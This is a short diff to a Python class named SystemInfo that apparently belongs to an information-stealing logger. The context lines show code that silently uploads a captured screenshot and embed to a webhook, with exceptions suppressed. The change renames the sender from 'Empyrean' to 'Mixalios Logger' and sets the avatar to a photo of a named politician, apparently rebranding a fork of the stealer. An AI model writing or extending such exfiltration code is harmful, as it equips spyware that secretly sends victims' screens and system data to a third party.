@@ -56,8 +56,8 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="Empyrean",
-                avatar_url="https://i.imgur.com/HjzfjfR.png"
+                username="Mixalios Logger",
+                avatar_url="https://upload.wikimedia.org/wikipedia/commons/a/a7/Ilias_Kasidiaris_a_Mar_21016_%28cropped%29.jpg"
             )
         except:
             pass
